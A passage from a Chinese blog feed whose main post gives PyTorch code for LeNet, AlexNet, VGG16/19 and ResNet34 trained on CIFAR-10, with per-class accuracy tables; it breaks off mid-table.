<li><code>D</code>：切换到下一张图片</li>
<li><code>Ctrl+S</code>：保存标注好的标签</li>
<li><code>del</code>：删除标注的矩形框</li>
<li><code>Ctrl+鼠标滚轮</code>：按住Ctrl，然后滚动鼠标滚轮，可以调整标注图片的显示大小</li>
<li><code>Ctrl+u</code>：选择要标注图片的文件夹</li>
<li><code>Ctrl+r</code>：选择标注好的label标签存放的文件夹</li>
<li><code>↑→↓←</code>：移动标注的矩形框的位置</li>
</ul>
<p>标注的时候，会把classe.txt预定义的标加载出来，然后我们只要选择对应的标签即可<br>右上角会显示已经标注目标的标签</p>
<h2 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h2><p>以yolo格式进行保存使用。</p>
]]></content>
      <categories>
        <category>目标检测</category>
      </categories>
      <tags>
        <tag>目标检测</tag>
      </tags>
  </entry>
  <entry>
    <title>LeNet_AlexNet_VGG_ResNet34_on_CIFAR10</title>
    <url>/2021/11/15/LeNet-AlexNet-VGG-ResNet34-on-CIFAR10/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="LeNet、AlexNet、VGG、ResNet34在CIFAR10上的准确度"><a href="#LeNet、AlexNet、VGG、ResNet34在CIFAR10上的准确度" class="headerlink" title="LeNet、AlexNet、VGG、ResNet34在CIFAR10上的准确度"></a>LeNet、AlexNet、VGG、ResNet34在CIFAR10上的准确度</h1><p>忽然对CNN卷积神经网络比较感兴趣，于是选择了CIFAR-10数据集进行机器视觉的学习。</p>
<span id="more"></span>
<h2 id="CIFAR-10"><a href="#CIFAR-10" class="headerlink" title="CIFAR-10"></a>CIFAR-10</h2><p><img src="https://www.mmrsl.cn/download/img/cifar10/1.png" alt=""></p>
<p>CIFAR-10是一个更接近普适物体的彩色图像数据集。CIFAR-10 是一个用于识别普适物体的小型数据集。一共包含10 个类别的RGB 彩色图片：飞机（ airplane ）、汽车（ automobile ）、鸟类（ bird ）、猫（ cat ）、鹿（ deer ）、狗（ dog ）、蛙类（ frog ）、马（ horse ）、船（ ship ）和卡车（ truck ）。</p>
<p>每个图片的尺寸为32 × 32 ，每个类别有6000个图像，数据集中一共有50000 张训练图片和10000 张测试图片。</p>
<h2 id="MNIST数据集"><a href="#MNIST数据集" class="headerlink" title="MNIST数据集"></a>MNIST数据集</h2><p>MNIST数据集是机器学习领域中非常经典的一个数据集，训练数据集包含 60,000 个样本, 测试数据集包含 10,000 样本. 在 MNIST 数据集中的每张图片由 28 x 28 个像素点构成, 每个像素点用一个灰度值表示. </p>
<p><img src="https://www.mmrsl.cn/download/img/cifar10/2.png" alt=""></p>
<h2 id="CIFAR-10和与MNIST之间的区别"><a href="#CIFAR-10和与MNIST之间的区别" class="headerlink" title="CIFAR-10和与MNIST之间的区别"></a>CIFAR-10和与MNIST之间的区别</h2><p>与MNIST数据集中目比， CIFAR-10 真高以下不同点</p>
<p>(1)、CIFAR-10 是3 通道的彩色RGB 图像，而MNIST 是灰度图像。<br>(2)、CIFAR-10 的图片尺寸为32 × 32 ， 而MNIST 的图片尺寸为28 × 28 ，比MNIST 稍大。<br>(3)、相比于手写字符， CIFAR-10 含有的是现实世界中真实的物体，不仅噪声很大，而且物体的比例、特征都不尽相同，这为识别带来很大困难。直接的线性模型如Softmax 在CIFAR-10 上表现得很差。</p>
<h2 id="LeNet代码"><a href="#LeNet代码" class="headerlink" title="LeNet代码"></a>LeNet代码</h2><pre class="line-numbers language-none"><code class="language-none">import torch
import torch.nn as nn
from torch import optim
from torch.utils.data import DataLoader
from torchvision import transforms
from torchvision import datasets
from tqdm import tqdm

transform &#x3D; transforms.Compose([
    transforms.RandomHorizontalFlip(),
    transforms.ToTensor()
    ])

# 定义超参数
BATCH_SIZE &#x3D; 128  # 批的大小
# CIFAR-10
train_dataset &#x3D; datasets.CIFAR10(&#39;.&#x2F;data1&#39;, train&#x3D;True, transform&#x3D;transform, download&#x3D;False)
train_loader &#x3D; DataLoader(train_dataset, batch_size&#x3D;BATCH_SIZE, shuffle&#x3D;True, num_workers&#x3D;0, pin_memory&#x3D;True)
test_dataset &#x3D; datasets.CIFAR10(&#39;.&#x2F;data1&#39;, train&#x3D;False, transform&#x3D;transform, download&#x3D;False)
test_loader &#x3D; DataLoader(test_dataset, batch_size&#x3D;BATCH_SIZE, shuffle&#x3D;False, num_workers&#x3D;0, pin_memory&#x3D;True)
classes &#x3D; (&#39;plane&#39;, &#39;car&#39;, &#39;bird&#39;, &#39;cat&#39;, &#39;deer&#39;, &#39;dog&#39;, &#39;frog&#39;, &#39;horse&#39;, &#39;ship&#39;, &#39;truck&#39;)

# 定义网络模型
class LeNet(nn.Module):
    def __init__(self):
        super(LeNet, self).__init__()

        # 卷积层
        self.cnn &#x3D; nn.Sequential(
            # 卷积层1，3通道输入，6个卷积核，核大小5*5
            # 经过该层图像大小变为32-5+1，28*28
            # 经2*2最大池化，图像变为14*14
            nn.Conv2d(3, 6, 5),
            nn.ReLU(),
            nn.MaxPool2d(2),

            # 卷积层2，6输入通道，16个卷积核，核大小5*5
            # 经过该层图像变为14-5+1，10*10
            # 经2*2最大池化，图像变为5*5
            nn.Conv2d(6, 16, 5),
            nn.ReLU(),
            nn.MaxPool2d(2)
        )

        # 全连接层
        self.fc &#x3D; nn.Sequential(
            # 16个feature，每个feature 5*5
            nn.Linear(16 * 5 * 5, 120),
            nn.ReLU(),
            nn.Linear(120, 84),
            nn.ReLU(),
            nn.Linear(84, 10)
        )

    def forward(self, x):
        x &#x3D; self.cnn(x)

        # x.size()[0]: batch size
        x &#x3D; x.view(x.size()[0], -1)
        x &#x3D; self.fc(x)

        return x
# 创建模型
net &#x3D; LeNet().to(&#39;cuda&#39;)
# 定义优化器和损失函数
criterion &#x3D; nn.CrossEntropyLoss()  # 交叉式损失函数
optimizer &#x3D; optim.SGD(net.parameters(), lr&#x3D;0.001, momentum&#x3D;0.9)  # 优化器


# 定义轮数
EPOCHS &#x3D; 50

for epoch in range(EPOCHS):
    train_loss &#x3D; 0.0
    for i, (datas, labels) in tqdm(enumerate(train_loader)):
        datas, labels &#x3D; datas.to(&#39;cuda&#39;), labels.to(&#39;cuda&#39;)
        # 梯度置零
        optimizer.zero_grad()
        # 训练
        outputs &#x3D; net(datas)
        # 计算损失
        loss &#x3D; criterion(outputs, labels)
        # 反向传播
        loss.backward()
        # 参数更新
        optimizer.step()
        # 累计损失
        train_loss +&#x3D; loss.item()
    print(&quot;Epoch : &#123;&#125; , Batch :&#123;&#125; , Loss : &#123;:.3f&#125;&quot;.format(epoch+1, i+1, train_loss&#x2F;len(train_loader.dataset)))


# 保存模型
PATH &#x3D; &#39;cifar_net.pth&#39;
torch.save(net.state_dict(), PATH)

# 加载模型
model &#x3D; net.to(&#39;cuda&#39;)
model.load_state_dict(torch.load(PATH))     # .load_state_dict() 加载模型

# 测试
correct &#x3D; 0
total &#x3D; 0
with torch.no_grad():
    for i, (datas, labels) in enumerate(test_loader):
        datas, labels &#x3D; datas.to(&#39;cuda&#39;), labels.to(&#39;cuda&#39;)
        # 输出
        outputs &#x3D; model(datas)  # outputs.data.shape --&gt; torch.Size([128, 10])
        _, predicted &#x3D; torch.max(outputs.data, dim&#x3D;1)   # 第一个是值的张量，第二个是序号的张量
        # 累计数据量
        total +&#x3D; labels.size(0)     # labels.size() --&gt; torch.Size([128]), labels.size(0) --&gt; 128
        # 比较有多少个预测正确
        correct +&#x3D; (predicted &#x3D;&#x3D; labels).sum()  # 相同为1，不同为0，利用sum()求总和
    print(&#39;在10000张测试集图片上的准确率：&#123;:.3f&#125;&#39;.format(correct &#x2F; total * 100))

# 显示每一类预测的概率
class_correct &#x3D; list(0. for i in range(10))
total &#x3D; list(0. for i in range(10))
with torch.no_grad():
    for (images, labels) in test_loader:
        # 输出
        images, labels &#x3D; images.to(&#39;cuda&#39;), labels.to(&#39;cuda&#39;)
        outputs &#x3D; model(images)
        # 获取到每一行最大值的索引
        _, predicted &#x3D; torch.max(outputs.data, dim&#x3D;1)
        c &#x3D; (predicted &#x3D;&#x3D; labels).squeeze()     # squeeze() 去掉0维[默认]， unsqueeze() 增加一维
        if labels.shape[0] &#x3D;&#x3D; 128:
            for i in range(BATCH_SIZE):
                label &#x3D; labels[i]   # 获取每一个label
                class_correct[label] +&#x3D; c[i].item()     # 累计True的个数，注意 1+True&#x3D;2， 1+False&#x3D;1
                total[label] +&#x3D; 1   # 该类总的个数

# 输出正确率
for i in range(10):
    print(&#39;正确率 ： %5s : %2d %%&#39; % (classes[i], 100 * class_correct[i] &#x2F; total[i]))
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="AlexNet"><a href="#AlexNet" class="headerlink" title="AlexNet"></a>AlexNet</h2><pre class="line-numbers language-none"><code class="language-none">class AlexNet(nn.Module):
    def __init__(self, num_classes):
        super(AlexNet, self).__init__()
        self.features &#x3D; nn.Sequential(
            nn.Conv2d(3, 64, kernel_size&#x3D;3, stride&#x3D;2, padding&#x3D;1),  # 修改了这个地方，不知道为什么就对了
            # raw kernel_size&#x3D;11, stride&#x3D;4, padding&#x3D;2. For use img size 224 * 224.
            nn.ReLU(inplace&#x3D;True),
            nn.MaxPool2d(kernel_size&#x3D;3, stride&#x3D;2),

            nn.Conv2d(64, 192, kernel_size&#x3D;5, padding&#x3D;2),
            nn.ReLU(inplace&#x3D;True),
            nn.MaxPool2d(kernel_size&#x3D;3, stride&#x3D;2),

            nn.Conv2d(192, 384, kernel_size&#x3D;3, padding&#x3D;1),
            nn.ReLU(inplace&#x3D;True),

            nn.Conv2d(384, 256, kernel_size&#x3D;3, padding&#x3D;1),
            nn.ReLU(inplace&#x3D;True),

            nn.Conv2d(256, 256, kernel_size&#x3D;3, padding&#x3D;1),
            nn.ReLU(inplace&#x3D;True),
            nn.MaxPool2d(kernel_size&#x3D;3, stride&#x3D;2), )
        self.classifier &#x3D; nn.Sequential(
            nn.Dropout(),
            nn.Linear(256 * 1 * 1, 4096),
            nn.ReLU(inplace&#x3D;True),
            nn.Dropout(),
            nn.Linear(4096, 4096),
            nn.ReLU(inplace&#x3D;True),
            nn.Linear(4096, num_classes), )

    def forward(self, x):
        x &#x3D; self.features(x)
        x &#x3D; x.view(x.size(0), 256 * 1 * 1)
        x &#x3D; self.classifier(x)
        # return F.log_softmax(inputs, dim&#x3D;3)
        return x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="VGG"><a href="#VGG" class="headerlink" title="VGG"></a>VGG</h2><h3 id="VGG16"><a href="#VGG16" class="headerlink" title="VGG16"></a>VGG16</h3><pre class="line-numbers language-none"><code class="language-none">
# 定义网络模型
class VGG16(nn.Module):
    def __init__(self, num_classes&#x3D;1000):
        super(VGG16, self).__init__()
        self.features &#x3D; nn.Sequential(
            # 1
            nn.Conv2d(3, 64, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(64),
            nn.ReLU(True),
            # 2
            nn.Conv2d(64, 64, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(64),
            nn.ReLU(True),
            nn.MaxPool2d(kernel_size&#x3D;2, stride&#x3D;2),
            # 3
            nn.Conv2d(64, 128, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(128),
            nn.ReLU(True),
            # 4
            nn.Conv2d(128, 128, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(128),
            nn.ReLU(True),
            nn.MaxPool2d(kernel_size&#x3D;2, stride&#x3D;2),
            # 5
            nn.Conv2d(128, 256, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(256),
            nn.ReLU(True),
            # 6
            nn.Conv2d(256, 256, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(256),
            nn.ReLU(True),
            # 7
            nn.Conv2d(256, 256, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(256),
            nn.ReLU(True),
            nn.MaxPool2d(kernel_size&#x3D;2, stride&#x3D;2),
            # 8
            nn.Conv2d(256, 512, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(512),
            nn.ReLU(True),
            # 9
            nn.Conv2d(512, 512, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(512),
            nn.ReLU(True),
            # 10
            nn.Conv2d(512, 512, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(512),
            nn.ReLU(True),
            nn.MaxPool2d(kernel_size&#x3D;2, stride&#x3D;2),
            # 11
            nn.Conv2d(512, 512, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(512),
            nn.ReLU(True),
            # 12
            nn.Conv2d(512, 512, kernel_size&#x3D;3, padding&#x3D;1),
            nn.BatchNorm2d(512),
            nn.ReLU(True),
            # 13
            nn.Conv2d(512, 512, kernel_size&#x3D;3, padding&#x3D;1),
            # nn.BatchNorm2d(512),
            nn.ReLU(True),
            nn.MaxPool2d(kernel_size&#x3D;2, stride&#x3D;2),
        )
        self.classifier &#x3D; nn.Sequential(
            # 14
            nn.Linear(512, 4096),
            nn.ReLU(True),
            nn.Dropout(),
            # 15
            nn.Linear(4096, 4096),
            nn.ReLU(True),
            nn.Dropout(),
            # 16
            nn.Linear(4096, num_classes),
        )
        # self.classifier &#x3D; nn.Linear(512, 10)

    def forward(self, x):
        out &#x3D; self.features(x)
        out &#x3D; out.view(out.size(0), -1)
        out &#x3D; self.classifier(out)
        return out
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="VGG19"><a href="#VGG19" class="headerlink" title="VGG19"></a>VGG19</h3><pre class="line-numbers language-none"><code class="language-none">
&#39;&#39;&#39;
创建VGG块
参数分别为输入通道数，输出通道数，卷积层个数，是否做最大池化
&#39;&#39;&#39;
def make_vgg_block(in_channel, out_channel, convs, pool&#x3D;True):
    net &#x3D; []

    # 不改变图片尺寸卷积
    net.append(nn.Conv2d(in_channel, out_channel, kernel_size&#x3D;3, padding&#x3D;1))
    net.append(nn.BatchNorm2d(out_channel))
    net.append(nn.ReLU(inplace&#x3D;True))

    for i in range(convs - 1):
        # 不改变图片尺寸卷积
        net.append(nn.Conv2d(out_channel, out_channel, kernel_size&#x3D;3, padding&#x3D;1))
        net.append(nn.BatchNorm2d(out_channel))
        net.append(nn.ReLU(inplace&#x3D;True))

    if pool:
        # 2*2最大池化，图片变为w&#x2F;2 * h&#x2F;2
        net.append(nn.MaxPool2d(2))

    return nn.Sequential(*net)

# 定义网络模型
class VGG19Net(nn.Module):
    def __init__(self):
        super(VGG19Net, self).__init__()

        net &#x3D; []

        # 输入32*32，输出16*16
        net.append(make_vgg_block(3, 64, 2))

        # 输出8*8
        net.append(make_vgg_block(64, 128, 2))

        # 输出4*4
        net.append(make_vgg_block(128, 256, 4))

        # 输出2*2
        net.append(make_vgg_block(256, 512, 4))

        # 无池化层，输出保持2*2
        net.append(make_vgg_block(512, 512, 4, False))

        self.cnn &#x3D; nn.Sequential(*net)

        self.fc &#x3D; nn.Sequential(
            # 512个feature，每个feature 2*2
            nn.Linear(512*2*2, 256),
            nn.ReLU(),

            nn.Linear(256, 256),
            nn.ReLU(),

            nn.Linear(256, 10)
        )

    def forward(self, x):
        x &#x3D; self.cnn(x)
        # x.size()[0]: batch size
        x &#x3D; x.view(x.size()[0], -1)
        x &#x3D; self.fc(x)

        return x

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ResNet34"><a href="#ResNet34" class="headerlink" title="ResNet34"></a>ResNet34</h2><h3 id="ResNet34-model1"><a href="#ResNet34-model1" class="headerlink" title="ResNet34 model1"></a>ResNet34 model1</h3><pre class="line-numbers language-none"><code class="language-none">class ResBlock(nn.Module):
    def __init__(self, in_channels, out_channels, stride&#x3D;1):
        super(ResBlock, self).__init__()

        # 残差块的第一个卷积
        # 通道数变换in-&gt;out，每一层（除第一层外）的第一个block
        # 图片尺寸变换：stride&#x3D;2时，w-3+2 &#x2F; 2 + 1 &#x3D; w&#x2F;2，w&#x2F;2 * w&#x2F;2
        # stride&#x3D;1时尺寸不变，w-3+2 &#x2F; 1 + 1 &#x3D; w
        self.conv1 &#x3D; nn.Conv2d(in_channels, out_channels, kernel_size&#x3D;3, stride&#x3D;stride, padding&#x3D;1)
        self.bn1 &#x3D; nn.BatchNorm2d(out_channels)
        self.relu &#x3D; nn.ReLU(inplace&#x3D;True)

        # 残差块的第二个卷积
        # 通道数、图片尺寸均不变
        self.conv2 &#x3D; nn.Conv2d(out_channels, out_channels, kernel_size&#x3D;3, stride&#x3D;1, padding&#x3D;1)
        self.bn2 &#x3D; nn.BatchNorm2d(out_channels)

        # 残差块的shortcut
        # 如果残差块的输入输出通道数不同，则需要变换通道数及图片尺寸，以和residual部分相加
        # 输出：通道数*2 图片尺寸&#x2F;2
        if in_channels !&#x3D; out_channels:
            self.downsample &#x3D; nn.Sequential(
                nn.Conv2d(in_channels, out_channels, kernel_size&#x3D;1, stride&#x3D;2),
                nn.BatchNorm2d(out_channels)
            )
        else:
            # 通道数相同，无需做变换，在forward中identity &#x3D; x
            self.downsample &#x3D; None

    def forward(self, x):
        identity &#x3D; x

        out &#x3D; self.conv1(x)
        out &#x3D; self.bn1(out)
        out &#x3D; self.relu(out)

        out &#x3D; self.conv2(out)
        out &#x3D; self.bn2(out)

        if self.downsample is not None:
            identity &#x3D; self.downsample(x)

        out +&#x3D; identity
        out &#x3D; self.relu(out)

        return out


&#39;&#39;&#39;
# 定义网络模型
&#39;&#39;&#39;
#定义网络结构

class ResNet34(nn.Module):
    def __init__(self, block):
        super(ResNet34, self).__init__()

        # 初始卷积层核池化层
        self.first &#x3D; nn.Sequential(
            # 卷基层1：7*7kernel，2stride，3padding，outmap：32-7+2*3 &#x2F; 2 + 1，16*16
            nn.Conv2d(3, 64, 7, 2, 3),
            nn.BatchNorm2d(64),
            nn.ReLU(inplace&#x3D;True),

            # 最大池化，3*3kernel，1stride（32的原始输入图片较小，不再缩小尺寸），1padding，
            # outmap：16-3+2*1 &#x2F; 1 + 1，16*16
            nn.MaxPool2d(3, 1, 1)
        )

        # 第一层，通道数不变
        self.layer1 &#x3D; self.make_layer(block, 64, 64, 3, 1)

        # 第2、3、4层，通道数*2，图片尺寸&#x2F;2
        self.layer2 &#x3D; self.make_layer(block, 64, 128, 4, 2)  # 输出8*8
        self.layer3 &#x3D; self.make_layer(block, 128, 256, 6, 2)  # 输出4*4
        self.layer4 &#x3D; self.make_layer(block, 256, 512, 3, 2)  # 输出2*2

        self.avg_pool &#x3D; nn.AvgPool2d(2)  # 输出512*1
        self.fc &#x3D; nn.Linear(512, 10)

    def make_layer(self, block, in_channels, out_channels, block_num, stride):
        layers &#x3D; []

        # 每一层的第一个block，通道数可能不同
        layers.append(block(in_channels, out_channels, stride))

        # 每一层的其他block，通道数不变，图片尺寸不变
        for i in range(block_num - 1):
            layers.append(block(out_channels, out_channels, 1))

        return nn.Sequential(*layers)

    def forward(self, x):
        x &#x3D; self.first(x)
        x &#x3D; self.layer1(x)
        x &#x3D; self.layer2(x)
        x &#x3D; self.layer3(x)
        x &#x3D; self.layer4(x)
        x &#x3D; self.avg_pool(x)

        # x.size()[0]: batch size
        x &#x3D; x.view(x.size()[0], -1)
        x &#x3D; self.fc(x)

        return x
# 创建模型
net &#x3D; ResNet34(ResBlock).to(&#39;cuda&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="ResNet34-model2"><a href="#ResNet34-model2" class="headerlink" title="ResNet34 model2"></a>ResNet34 model2</h3><pre class="line-numbers language-none"><code class="language-none">
#定义网络结构
class ResNet34(nn.Module):
    def __init__(self, block):
        super(ResNet34, self).__init__()

        # 初始卷积层核池化层
        self.first &#x3D; nn.Sequential(
            # 卷基层1：3*3kernel，1stride，1padding，outmap：32-3+1*2 &#x2F; 1 + 1，32*32
            nn.Conv2d(3, 64, 3, 1, 1),
            nn.BatchNorm2d(64),
            nn.ReLU(inplace&#x3D;True),

            # 最大池化，3*3kernel，1stride（保持尺寸），1padding，
            # outmap：32-3+2*1 &#x2F; 1 + 1，32*32
            nn.MaxPool2d(3, 1, 1)
        )

        # 第一层，通道数不变
        self.layer1 &#x3D; self.make_layer(block, 64, 64, 3, 1)

        # 第2、3、4层，通道数*2，图片尺寸&#x2F;2
        self.layer2 &#x3D; self.make_layer(block, 64, 128, 4, 2)  # 输出16*16
        self.layer3 &#x3D; self.make_layer(block, 128, 256, 6, 2)  # 输出8*8
        self.layer4 &#x3D; self.make_layer(block, 256, 512, 3, 2)  # 输出4*4

        self.avg_pool &#x3D; nn.AvgPool2d(4)  # 输出512*1
        self.fc &#x3D; nn.Linear(512, 10)

    def make_layer(self, block, in_channels, out_channels, block_num, stride):
        layers &#x3D; []

        # 每一层的第一个block，通道数可能不同
        layers.append(block(in_channels, out_channels, stride))

        # 每一层的其他block，通道数不变，图片尺寸不变
        for i in range(block_num - 1):
            layers.append(block(out_channels, out_channels, 1))

        return nn.Sequential(*layers)

    def forward(self, x):
        x &#x3D; self.first(x)
        x &#x3D; self.layer1(x)
        x &#x3D; self.layer2(x)
        x &#x3D; self.layer3(x)
        x &#x3D; self.layer4(x)
        x &#x3D; self.avg_pool(x)

        # x.size()[0]: batch size
        x &#x3D; x.view(x.size()[0], -1)
        x &#x3D; self.fc(x)

        return x

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li>若第一次运行可以<code>train_dataset = datasets.CIFAR10(&#39;./data1&#39;, train=True, transform=transform, download=False)</code>将download改为true.</li>
<li>其他网络在LeNet基础上替换网络即可运行。</li>
<li>参考我之前的文章安装环境<a href="https://www.mmrsl.cn/2021/10/22/ubuntu-NVIDIA30xx%E6%98%BE%E5%8D%A1%E5%AE%89%E8%A3%85/">Ubuntu系统安装NVIDIARTX30xx显卡驱动，开发环境安装</a></li>
</ol>
<h3 id="数据扩充"><a href="#数据扩充" class="headerlink" title="数据扩充"></a>数据扩充</h3><pre class="line-numbers language-none"><code class="language-none">transform &#x3D; transforms.Compose([
    transforms.ToTensor(),
    transforms.Normalize([0.5, 0.5, 0.5], [0.5, 0.5, 0.5])])

transform_train &#x3D; transforms.Compose([
    # 对原始32*32图像四周各填充4个0像素（40*40），然后随机裁剪成32*32
    transforms.RandomCrop(32, padding&#x3D;4),
    # 按0.5的概率水平翻转图片
    transforms.RandomHorizontalFlip(),
    transforms.ToTensor(),
    transforms.Normalize([0.5, 0.5, 0.5], [0.5, 0.5, 0.5])])

transform_test &#x3D; transforms.Compose([
    transforms.ToTensor(),
    transforms.Normalize([0.5, 0.5, 0.5], [0.5, 0.5, 0.5])])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="不同网络测试结果"><a href="#不同网络测试结果" class="headerlink" title="不同网络测试结果"></a>不同网络测试结果</h2><blockquote>
<p>EPOCHS=50</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th>网络类型</th>
<th>LeNet</th>
<th>AlexNet</th>
<th>VGG19</th>
<th>VGG16</th>
<th>ResNet34 1</th>
<th>ResNet34 2</th>
</tr>
</thead>
<tbody>
<tr>
<td>准确度</td>
<td>58.990%</td>
<td>64.55%</td>
<td>84.610%</td>
<td>83.670%</td>
<td>78.790%</td>
<td>85.14%</td>
</tr>
<tr>
<td>loss</td>
<td>0.009</td>
<td>0.007</td>
<td>0.000</td>
<td>0.000</td>
<td>0.00</td>
<td>0.00</td>
</tr>
<tr>
<td>plane 准确度</td>
<td>66%</td>
<td>81%</td>
<td>87%</td>
<td>88%</td>
<td>83%</td>
<td>88%</td>
</tr>
<tr>
<td>car 准确度</td>
<td>70%</td>
<td>85%</td>
<td>90%</td>
<td>90%</td>
<td>84%</td>
<td>93%</td>
</tr>
<tr>
<td>bird 准确度</td>
<td>48%</td>
<td>56%</td>
<td>74%</td>
<td>73%</td>
<td>69%</td>
<td>79%</td>
</tr>
<tr>
<td>cat 准确度</td>
<td>39%</td>
<td>32%</td>
<td>67%</td>
<td>71%</td>
<td>59%</td>
<td>70%</td>
</tr>
<tr>
<td>deer 准确度</td>
<td>58%</td>
<td>66%</td>
<td>86%</td>
<td>86%</td>
<td>74%</td>
<td>82%</td>
</tr>
<tr>
<td>dog 准确度</td>
<td>44%</td>
<td>46%</td>
<td>77%</td>
<td>77%</td>
<td>68%</td>
<td>75%</td>
</tr>
<tr>
<td>frog 准确度</td>
<td>72%</td>
<td>65%</td>
<td>90%</td>
<td>86%</td>
<td>84%</td>
<td>89%</td>
</tr>
<tr>
<td>horse 准确度</td>
<td>65%</td>
<td>64%</td>
<td>89%</td>
<td>83%</td>
<td>82%</td>
<td>89%</td>
</tr>
<tr>
<td>ship 准确度</td>
<td>69%</td>
<td>79%</td>
<td>91%</td>
<td>92%</td>
<td>89%</td>
<td>92%</td>
</tr>
<tr>
<td>truck 准确度</td>
<td>59%</td>
<td>64%</td>
<td>90%</td>
<td>90%</td>
<td>86%</td>
<td>90%</td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<p>扩充准确度 EPOCHS=50</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th>网络类型</th>
<th>VGG19</th>
<th>ResNet34 2</th>
</tr>
</thead>
<tbody>
<tr>
<td>准确度</td>
<td>87.220%</td>
<td>87.09%</td>
</tr>
<tr>
<td>loss</td>
<td>0.001</td>
<td>0.000</td>
</tr>
<tr>
<td>plane 准确度</td>
<td>85%</td>
<td>85%</td>
</tr>
<tr>
<td>car 准确度</td>
<td>93%</td>
<td>92%</td>
</tr>
<tr>
<td>bird 准确度</td>
<td>80%</td>
